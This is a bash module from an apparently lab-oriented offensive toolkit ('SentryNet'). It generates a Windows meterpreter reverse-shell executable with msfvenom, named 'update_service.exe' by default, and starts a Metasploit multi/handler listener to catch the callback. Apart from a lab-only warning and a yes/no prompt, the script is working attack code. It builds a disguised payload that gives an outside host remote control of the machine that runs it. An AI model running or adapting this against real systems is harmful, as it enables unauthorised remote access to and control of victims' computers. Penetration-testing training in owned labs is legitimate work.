#!/bin/bash
# ==========================================================
# modules/win/attack2_shell.sh
# CONTROLLED / ACTIVE — LAB ONLY
#
# Objective: Demonstrate payload generation + reverse-shell handler
# workflow against an authorized lab target, for post-exploitation
# awareness/training.
# Tools: msfvenom, msfconsole
#
# Note: unlike other modules, this one doesn't take a "victim IP" —
# LHOST here is YOUR OWN Kali/attacker machine's IP (where the
# listener runs and the payload calls back to), which is why it's
# prompted separately rather than via prompt_target().
# ==========================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../common.sh"

detect_local_ip() {
    hostname -I 2>/dev/null | awk '{print $1}'
}

run_shell() {
    check_deps msfvenom msfconsole

    local suggested_ip
    suggested_ip=$(detect_local_ip)

    warn "=============================================="
    warn " This module generates a working reverse-shell"
    warn " payload and starts a listener. Only deploy the"
    warn " payload on a lab VM you own/control."
    warn "=============================================="
    read -rp "Confirm this is for an authorized lab exercise (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        error "Not confirmed. Aborting."
        return 1
    fi

    read -rp "Enter your listener (Kali) IP [detected: ${suggested_ip:-none}]: " kali_ip
    kali_ip="${kali_ip:-$suggested_ip}"
    if ! validate_target "$kali_ip" >/dev/null; then
        error "Invalid listener IP."
        return 1
    fi

    read -rp "Enter listener port [default: 4444]: " lport
    lport="${lport:-4444}"
    if ! [[ "$lport" =~ ^[0-9]+$ ]] || [ "$lport" -lt 1 ] || [ "$lport" -gt 65535 ]; then
        error "Invalid port."
        return 1
    fi

    read -rp "Payload output filename [default: update_service.exe]: " payload_name
    payload_name="${payload_name:-update_service.exe}"

    local LOGFILE
    LOGFILE=$(log_path "win_shell")

    if command -v figlet >/dev/null 2>&1 && command -v lolcat >/dev/null 2>&1; then
        figlet "Attack 2" | lolcat
    fi
    info "Attack Type: Reverse Shell (Metasploit)"
    info "Listener: $kali_ip:$lport  |  Payload: /tmp/$payload_name"

    {
        echo "===== SentryNet Reverse Shell Setup ====="
        date
        echo "LHOST: $kali_ip  LPORT: $lport  Payload: /tmp/$payload_name"
    } | tee "$LOGFILE"

    info "Generating payload..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$kali_ip" LPORT="$lport" -f exe -o "/tmp/$payload_name"
    ok "Payload ready: /tmp/$payload_name"

    info "Starting listener (multi/handler)..."
    echo ""
    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $kali_ip; set LPORT $lport; exploit"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    run_shell
fi
